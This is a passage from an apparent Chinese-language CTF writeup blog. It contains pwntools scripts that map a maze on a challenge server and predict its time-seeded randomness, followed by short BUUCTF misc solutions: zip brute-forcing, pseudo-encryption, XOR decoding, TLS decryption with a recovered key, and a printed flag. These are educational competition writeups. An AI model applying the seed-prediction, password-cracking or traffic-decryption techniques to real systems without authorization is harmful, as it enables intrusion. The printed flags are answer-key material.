class="string">&quot;BOOM&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;Caught&quot;</span> <span class="keyword">in</span> infor <span class="keyword">or</span> <span class="string">&quot;OK&quot;</span> <span class="keyword">in</span> infor:</span><br><span class="line">            <span class="built_in">map</span>[tmp_x][tmp_y] = NOTHING</span><br><span class="line">            x = tmp_x</span><br><span class="line">            y = tmp_y</span><br><span class="line">            status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;error or flag: &quot;</span>,infor)</span><br><span class="line">            pause()</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span>,x,y,status</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">map</span>[tmp_x][tmp_y] == WALL:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span>,x,y,status</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">map</span>[tmp_x][tmp_y] == BOMB:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span>,x,y,status</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ukown&quot;</span>,<span class="built_in">map</span>[tmp_x][tmpp_y],tmp_x,tmp_y)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span>,x,y,status</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 加载已保存的地图数据 与 初始化地图 二选一</span></span><br><span class="line"><span class="string">map = [[] for i in range(60)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pic = Image.open(&#x27;./map.png&#x27;)</span></span><br><span class="line"><span class="string">w,h = pic.size</span></span><br><span class="line"><span class="string">for i in range(h):</span></span><br><span class="line"><span class="string">    for j in range(w):</span></span><br><span class="line"><span class="string">        pixel = pic.getpixel((j,i))</span></span><br><span class="line"><span class="string">        if pixel == (0,0,0) or pixel == (255,0,0):</span></span><br><span class="line"><span class="string">            map[i].append(WALL)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            map[i].append(NOTHING)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 初始化迷宫地图 与 加载保存一半的地图信息 二选一</span></span><br><span class="line"><span class="built_in">map</span> = [[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">0</span>]]</span><br><span class="line"><span class="comment"># 初始化栈</span></span><br><span class="line">stack = [[<span class="number">1</span>,<span class="number">1</span>,[<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;d&#x27;</span>],]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    game = remote(<span class="string">&quot;59.110.63.160&quot;</span>, <span class="number">40001</span>)</span><br><span class="line"></span><br><span class="line">    x,y = <span class="number">1</span>,<span class="number">1</span> ; exit = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            pos = stack[-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> [x,y] == pos[:<span class="number">2</span>]:</span><br><span class="line">                tmp_directions = []</span><br><span class="line">                tmp_directions.extend(pos[<span class="number">2</span>])</span><br><span class="line">                <span class="keyword">for</span> direction <span class="keyword">in</span> pos[<span class="number">2</span>]:</span><br><span class="line">                    <span class="built_in">map</span>,tmp_x,tmp_y,status = turn(game,<span class="built_in">map</span>,direction,x,y)</span><br><span class="line">                    tmp_directions.remove(direction)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> status == <span class="literal">True</span>:</span><br><span class="line">                        x,y = tmp_x,tmp_y</span><br><span class="line">                        stack[-<span class="number">1</span>][<span class="number">2</span>] = tmp_directions</span><br><span class="line">                        tmp = []</span><br><span class="line">                        tmp.extend(directions)</span><br><span class="line">                        tmp.remove(dic[direction])</span><br><span class="line">                        stack.extend([[x,y,tmp,dic[direction]]])</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> status == <span class="string">&quot;BOOM&quot;</span>:</span><br><span class="line">                        x,y = tmp_x,tmp_y</span><br><span class="line">                        stack[-<span class="number">1</span>][<span class="number">2</span>] = tmp_directions</span><br><span class="line">                        <span class="keyword">raise</span> Exception(<span class="string">&quot;BOOM!!!&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">map</span>,x,y,status = turn(game,<span class="built_in">map</span>,pos[-<span class="number">1</span>],x,y)</span><br><span class="line">                    stack.pop()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 重连之后走回到上次遇见炸弹前的节点</span></span><br><span class="line">            <span class="keyword">elif</span> [x,y] == [<span class="number">1</span>,<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> stack[<span class="number">1</span>:]:</span><br><span class="line">                    <span class="built_in">map</span>,x,y,status = turn(game,<span class="built_in">map</span>,dic[i[<span class="number">3</span>]],x,y)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ukown: &quot;</span>,[x,y])</span><br><span class="line">                pause()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit = <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> Exception,err:</span><br><span class="line">        game.close()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="comment"># 保存迷宫地图信息</span></span><br><span class="line">        img = Image.new(<span class="string">&quot;RGB&quot;</span>,(<span class="built_in">len</span>(<span class="built_in">map</span>[<span class="number">0</span>]),<span class="built_in">len</span>(<span class="built_in">map</span>)))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">map</span>)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">map</span>[<span class="number">0</span>])):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">map</span>[i][j] == <span class="number">0</span>:</span><br><span class="line">                    img.putpixel((j,i),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">map</span>[i][j] == <span class="number">1</span>:</span><br><span class="line">                    img.putpixel((j,i),<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">map</span>[i][j] == <span class="number">2</span>:</span><br><span class="line">                    img.putpixel((j,i),(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">        <span class="built_in">print</span>(img.size)</span><br><span class="line">        img.save(<span class="string">&quot;map_1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> exit == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesmap_1.png" alt="map_1"></p>
<p>遍历出地图之后，利用题目源码写抓猫算法。（ps：就是本地模拟服务器程序运行状态，random的seed是由连接题目程序时的时间决定的，seed已知，本地模拟服务器状态，深度优先求解<code>PERSON</code>与<code>CAT</code>的最短路径，这里因为嫌麻烦不想再该刚刚遍历地图的脚本了就选择了去网上找个现成的轮子，结果拿回来各种调试修bug，一个下午又被浪费了emmm 最后恼羞成怒又写了个轮子哭唧唧）</p>
<p>另外，出题人的服务器就离谱！！！此处疯狂diss出题人，第一天晚上做题的时候刚开始做就发现题目挂了，被迫睡大觉，第二天题目好了，但是服务器的时区延时是认真的么，不给时区信息的同时，服务器本地时间还比北京时间快了整整两秒！！！</p>
<p>其实本来网上的轮子也没啥，它的问题就那么一丢，本体调试几遍就能用了，但是跑flag的时候和服务器的输出一直对不上，结果一直在调试脚本找本地的bug，结果最后才知道本地已经完美了，数据对不上是服务器的<code>seed</code>比本地延时了2s！！！淦！ping服务器，响应延迟只有不到20ms，当时因为想着出题人没给提示应该是默认北京时区互联网时间，所以做多也就试了把本地模拟服务器的时间种子值加1，依旧不对。最后突然试了下加2对了。不说了，我是fw TAT</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python -u</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> dfs</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTHING = <span class="number">0</span></span><br><span class="line">WALL = <span class="number">1</span></span><br><span class="line">BOMB = <span class="number">2</span></span><br><span class="line">CAT = <span class="number">3</span></span><br><span class="line">PERSON = <span class="number">4</span></span><br><span class="line">dic = dfs.dic</span><br><span class="line">directions = [<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randint</span>(<span class="params">start, end</span>):</span></span><br><span class="line">    m = end - start + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> random.getrandbits(<span class="number">16</span>) % m + start</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, <span class="built_in">map</span></span>):</span></span><br><span class="line">        self.seed = <span class="built_in">int</span>(time.time()) + <span class="number">2</span></span><br><span class="line">        random.seed(self.seed)</span><br><span class="line">        self.<span class="built_in">map</span> = <span class="built_in">map</span></span><br><span class="line">        self.n = <span class="built_in">len</span>(self.<span class="built_in">map</span>)</span><br><span class="line">        self.x = <span class="number">1</span></span><br><span class="line">        self.y = <span class="number">1</span></span><br><span class="line">        self.cx = <span class="number">0</span></span><br><span class="line">        self.cy = <span class="number">0</span></span><br><span class="line">        self.count = <span class="number">0</span></span><br><span class="line">        self.placeCat(firsttime = <span class="literal">True</span>)</span><br><span class="line">        self.time = <span class="number">0</span></span><br><span class="line">        self.persontime = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">placeCat</span>(<span class="params">self, firsttime = <span class="literal">False</span></span>):</span></span><br><span class="line">        tmpmap = copy.deepcopy(self.<span class="built_in">map</span>)</span><br><span class="line">        tmpmap[self.x][self.y] = PERSON</span><br><span class="line">        tmpmap[self.cx][self.cy] = CAT</span><br><span class="line">        <span class="keyword">if</span> firsttime:</span><br><span class="line">            i = self.n - <span class="number">2</span></span><br><span class="line">            j = self.n - <span class="number">2</span></span><br><span class="line">            <span class="keyword">while</span> tmpmap[i][j] != NOTHING:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                j -= <span class="number">1</span></span><br><span class="line">            self.cx = i</span><br><span class="line">            self.cy = j</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i = randint(<span class="number">1</span>, self.n - <span class="number">2</span>)</span><br><span class="line">            j = randint(<span class="number">1</span>, self.n - <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">while</span> tmpmap[i][j] != NOTHING:</span><br><span class="line">                i = randint(<span class="number">1</span>, self.n - <span class="number">2</span>)</span><br><span class="line">                j = randint(<span class="number">1</span>, self.n - <span class="number">2</span>)</span><br><span class="line">            self.cx = i</span><br><span class="line">            self.cy = j</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">self, c, p</span>):</span></span><br><span class="line">        self.time += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.time &gt; <span class="number">4000</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;DARKFLAMEMASTER&quot;</span></span><br><span class="line">            sys.exit(-<span class="number">1</span>)</span><br><span class="line">        tmpmap = copy.deepcopy(self.<span class="built_in">map</span>)</span><br><span class="line">        tmpmap[self.x][self.y] = PERSON</span><br><span class="line">        tmpmap[self.cx][self.cy] = CAT</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p == PERSON:</span><br><span class="line">            x = self.x</span><br><span class="line">            y = self.y</span><br><span class="line">        <span class="keyword">elif</span> p == CAT:</span><br><span class="line">            x = self.cx</span><br><span class="line">            y = self.cy</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">            y -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">            x -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p == PERSON:</span><br><span class="line">            self.persontime += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> tmpmap[x][y] == WALL:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;WALL.&quot;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> tmpmap[x][y] == BOMB:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;BOMB.&quot;</span></span><br><span class="line">                sys.exit(-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> tmpmap[x][y] == CAT:</span><br><span class="line">                self.count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> self.count == <span class="number">10</span>:</span><br><span class="line">                    <span class="built_in">print</span> self.time</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&quot;SUCCESS!!!&quot;</span></span><br><span class="line">                self.x = x</span><br><span class="line">                self.y = y</span><br><span class="line">                self.placeCat()</span><br><span class="line">                <span class="comment">#print &quot;Caught!&quot;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.x = x</span><br><span class="line">                self.y = y</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;OK.&quot;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> p == CAT:</span><br><span class="line">            <span class="keyword">if</span> tmpmap[x][y] == NOTHING:</span><br><span class="line">                self.cx = x</span><br><span class="line">                self.cy = y</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">self,direction</span>):</span></span><br><span class="line">        <span class="keyword">if</span> direction <span class="keyword">not</span> <span class="keyword">in</span> directions:</span><br><span class="line">            sys.exit(-<span class="number">1</span>)</span><br><span class="line">        self.move(direction, PERSON)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.persontime % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                choice = randint(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">                direction = directions[choice]</span><br><span class="line">                randcount = <span class="number">0</span></span><br><span class="line">                <span class="keyword">while</span> self.move(direction, CAT) == <span class="literal">False</span>:</span><br><span class="line">                    choice = randint(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">                    direction = directions[choice]</span><br><span class="line">                    randcount += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> randcount == <span class="number">10</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span> = [[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>)]</span><br><span class="line"></span><br><span class="line">pic = Image.<span class="built_in">open</span>(<span class="string">&#x27;./map_2.png&#x27;</span>)</span><br><span class="line">w,h = pic.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        pixel = pic.getpixel((i,j))</span><br><span class="line">        <span class="keyword">if</span> pixel == (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="keyword">or</span> pixel == (<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">            <span class="built_in">map</span>[i].append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">map</span>[i].append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">time_1 = <span class="built_in">int</span>(time.time())</span><br><span class="line">sh = remote(<span class="string">&quot;59.110.63.160&quot;</span>,<span class="number">40001</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;127.0.0.1&quot;,10002)</span></span><br><span class="line">game = Game(<span class="built_in">map</span>)</span><br><span class="line">time_2 = <span class="built_in">int</span>(time.time())</span><br><span class="line"><span class="comment">#sleep(0.3)</span></span><br><span class="line"><span class="comment">#print(sh.recv(),game.seed)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> time_1 != time_2:</span><br><span class="line">    <span class="built_in">print</span>(time_1,time_2)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    path = dfs.dfs_fun(<span class="built_in">map</span>,(game.x,game.y),(game.cx,game.cy))</span><br><span class="line">    num = [<span class="number">4000</span>,-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(i) &lt; num[<span class="number">0</span>]:</span><br><span class="line">            num[<span class="number">0</span>] = <span class="built_in">len</span>(i)</span><br><span class="line">            num[<span class="number">1</span>] = path.index(i)</span><br><span class="line">    path = path[num[<span class="number">1</span>]] ; path = path[<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">        direction = dic[i[-<span class="number">1</span>]]</span><br><span class="line">        tmp_num = <span class="built_in">int</span>(game.count)</span><br><span class="line">        game.start(direction)</span><br><span class="line">        sh.sendline(direction)</span><br><span class="line">        <span class="comment">#sleep(0.1)</span></span><br><span class="line">        infor = sh.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span> infor</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Caught&quot;</span> <span class="keyword">in</span> infor:</span><br><span class="line">            pause()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Caught&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> infor <span class="keyword">and</span> <span class="string">&quot;OK&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> infor:</span><br><span class="line"></span><br><span class="line">            pause()</span><br><span class="line">        <span class="keyword">if</span> game.count == <span class="number">10</span>:</span><br><span class="line">            pause()</span><br><span class="line">        <span class="keyword">if</span> game.count - tmp_num == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-MISC(三)</title>
    <url>/2020/02/24/BUU-Misc-three/</url>
    <content><![CDATA[<p><strong>最近更新：</strong> <em>2021-04-14 23:45</em></p>
<h2 id="GUET-CTF2019-zips"><a href="#GUET-CTF2019-zips" class="headerlink" title="[GUET-CTF2019]zips"></a>[GUET-CTF2019]zips</h2><p>第一层压缩包密码直接爆破，第二次是伪加密，第三层根据 <code>sh</code> 的命令可知密钥是压缩包创建时的时间戳，查看压缩包修改日期，在线工具看一下那一天的时间戳，时间戳其实就是一个距离那个一九几几年几月几日零时零分零秒的秒数，同一天的时间戳前几位肯定一样，又因为其所使用python的相关时间戳函数范围的值精确到了小数点后两位，所以这里使用掩码攻击爆破密钥<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages时间戳1.png" alt="时间戳1.png"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages时间戳2.png" alt="时间戳2.png"></p>
<h2 id="GUET-CTF2019-KO"><a href="#GUET-CTF2019-KO" class="headerlink" title="[GUET-CTF2019]KO"></a>[GUET-CTF2019]KO</h2><p>就是<code>ook</code>编码的签到，找个在线解码网站解一下码就行了</p>
<h2 id="从娃娃抓起"><a href="#从娃娃抓起" class="headerlink" title="从娃娃抓起"></a>从娃娃抓起</h2><p>题目说是和汉字里程碑的两种编码方式。首先就想到了可能和汉字输入法有关，肯定不是拼音输入，于是想到五笔输入，很明显纯四位数字和五笔没有关系，试试下面的字母，果然拿到了半句连贯的话。上面的四位数字找了好久才找到是上世纪的电报码，我天，太狗了。电报码翻译过来是人工智能。连起来求md5即为flag</p>
<h2 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h2><p>打开之后发现就是50分的签到类的题，觉得应该不会有什么太大的坑。然而这里是我蒙出来的我特喵，瞎猜真的很难猜的，希望以后能少一点瞎猜，多一丝对吹头发选手的关爱TAT<br>因为是50分的题，又发现这是一列十六进制的值，关键是都在<code>80</code>到<code>ff</code>之间，就盲猜是原字符的ASCII码值加了128，写个脚本就出来了</p>
<p>  That was fast! The flag is: DDCTF{922ab9974a47cd322cf43b50610faea5}</p>
<h2 id="GWCTF2019-huyao"><a href="#GWCTF2019-huyao" class="headerlink" title="[GWCTF2019]huyao"></a>[GWCTF2019]huyao</h2><p>两个一样的图片，不过大小差了大概十几kb，目测是盲水印，去GitHub找一下盲水印的脚本，跑一下即可，另外，GitHub上面有两种不兼容版本的盲水印，一般用这个版本写入的水印只能用这个版本提取。</p>
<h2 id="HBNIS2018-excel破解"><a href="#HBNIS2018-excel破解" class="headerlink" title="[HBNIS2018]excel破解"></a>[HBNIS2018]excel破解</h2><p>我尽力破解密码了，但着实爆不出来。不过这题有另外的不知道是不是非预期解，winhex搜索或者strings命令都能直接看到flag</p>
<h2 id="voip"><a href="#voip" class="headerlink" title="voip"></a>voip</h2><p>百度voip，学到这是网络电话用的协议，那这个流量包很明显就是捕获的一次在线通话，wireshark中有相关分析功能，如下：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesRTP2.png" alt="RTP2.png"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesRTP3.png" alt="RTP3.png"></p>
<p>经过本废喵十分钟的努力，终于记下了整个通话内容的全部单词。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hi,this is your service.Please press one to listen flag.The flag is S E C C O N,hold on,please.9 0 0 1 I V R close race only capital letter for you.NO,thanks.</span><br></pre></td></tr></table></figure>
<p>后来百度知道这是secconctf，我一开始以为flag是flag{SECCON9001IVR}，丢，原来是SECCON{9001IVR}emmm</p>
<h2 id="GUET-CTF2019-虚假的压缩包"><a href="#GUET-CTF2019-虚假的压缩包" class="headerlink" title="[GUET-CTF2019]虚假的压缩包"></a>[GUET-CTF2019]虚假的压缩包</h2><p>题目给了两个压缩包，虚假的那个明显是伪加密的意思，遇压缩包不觉先上7z，伪加密的压缩包7z可以直接解压缩并告知压缩包数据头部信息有错，这个错误直接忽略就可。得到 <code>key.txt</code> ，里面的内容明显是让解一个简单的<code>rsa</code>计算，<code>n=33</code>，<code>e=3</code>，这和直接说 <code>d=7</code> 有啥区别，不如放一个稍微花里胡哨点的解密好玩2333。真实的压缩包的密码脑洞了一下下，不过只是一下下，还在正常范围之内。txt最后的那句话加上答案才是完整密码————<strong>答案是5</strong>.解密是一张图片和不知道是啥的文件，这里因为开了kali想用<code>file</code>命令查看那个未知文件是不是已知文件类型，结果发现图片在卡里下无法显示，故winhex修改高度看到提示 <code>^5</code> ，那就写个脚本和5异或咯。<br><del>这里犯了个小错，一开始直接把文件的十六进制数据和5异或了，然后发现得到的结果有问题，后来仔细看了看，出题人已经把文件的十六进制encode一次了，直接用读取用int转一下数据类型就可以了</del></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cipher&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> io,<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fi:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        tmp = io.read(<span class="number">128</span>)</span><br><span class="line">        <span class="built_in">print</span>(tmp)</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">            flag += <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(i,<span class="number">16</span>)^<span class="number">5</span>)[<span class="number">2</span>:])</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">        fi.write(binascii.a2b_hex(flag.strip()))</span><br></pre></td></tr></table></figure>
<p>然后winhex打开生成的文件看到开头又PK和xml的字符，推测是office的文件，先试试word文档打开，发现显示正常，结尾有多余的空格和换行，估计是白色字体，全选之后改一下字体颜色看到flag。<br><img src="http://lychee.xibai.xyz/uploads/big/7503f8658073cff565bf143961da9179.png" alt="xml"></p>
<h2 id="RCTF2019-draw"><a href="#RCTF2019-draw" class="headerlink" title="[RCTF2019]draw"></a>[RCTF2019]draw</h2><p>这是少儿编程logo语言，在网上找了好几个版本的解释器都不能完全识别文本的所有命令，最后在google上的一个在线工具中完整执行。。。再次验证在线工具一般情况比离线工具强的莫名理论emmmm</p>
<h2 id="greatescape"><a href="#greatescape" class="headerlink" title="greatescape"></a>greatescape</h2><p>这个题让我深感只会基操就来硬刚wireshark的难受。以后有空了认真拿着wireshark的教学手册修炼一波，一条一条流量硬刚的日子再也不想过了555.<br>首先查看流量协议类型发现存在<code>ftp</code>和<code>smtp</code>两种关键流量，前者一般人都知道是访问服务器文件的，后者略微冷一点点，不过大家玩信安的也应该有了解过，大概就是是邮件通信服务的协议类型。<br>分析两种流量的内容，在<code>ftp</code>流量中发现一个文件<code>ssc.key</code>，查看<code>stmp</code>中的邮件内容，得到关键信息：<br><img src="http://lychee.xibai.xyz/uploads/small/20c1fb4142fa45e68c9ee89c4621a089.png" alt="stmp"><br>他会通过<code>https://ssc.teaser.insomnihack.ch</code>该域名的服务器传输东西，那么很明显了，前面的<code>ssc.key</code>是一个类似于RSA私钥的文件（我打开看了确实是RSA私钥），而这里访问这个<code>SSC</code>的服务器用了<code>SSL</code>的加密，在 <strong>得到了私钥的情况下就可以为wireshark指定对目标TLS加密流量进行解密</strong> 。通过 编辑-&gt;首选项-&gt;protocol（协议）-&gt;（<strong><em>老版wireshark选择SSL</em></strong>）TLS -&gt;RSA keys list:Edit..,直接添加指定IP、端口、协议、本地RSA私钥文件的信息，然后重新打开该流量包文件即可查看之前一些乱码的目标流量信息。在前面提到的那个<code>SSC</code>相关的所有解密了的流量信息中查找关键信息，一条一条的找着审啊（回头必须学一些进阶操作惹），在<code>tcp.stream eq 80</code>的http流量中发现小旗纸。<br><img src="http://lychee.xibai.xyz/uploads/big/b09d7fb35dd7eb319bea8af22cf86d93.png" alt="flag"></p>
<h2 id="HBNIS2018-来题中等的吧"><a href="#HBNIS2018-来题中等的吧" class="headerlink" title="[HBNIS2018]来题中等的吧"></a>[HBNIS2018]来题中等的吧</h2><p>一开始没认出来这是音频分析里的图像emmm，后来看着图片开头竖着一列点点，中间横着一条线，才发现这是音频分析的截图。那就好说了，转一手摩斯电码就可，注意莫斯电码结果都是小写</p>
<h2 id="HBNIS2018-caesar"><a href="#HBNIS2018-caesar" class="headerlink" title="[HBNIS2018]caesar"></a>[HBNIS2018]caesar</h2><p>入门凯撒，偏移一位</p>
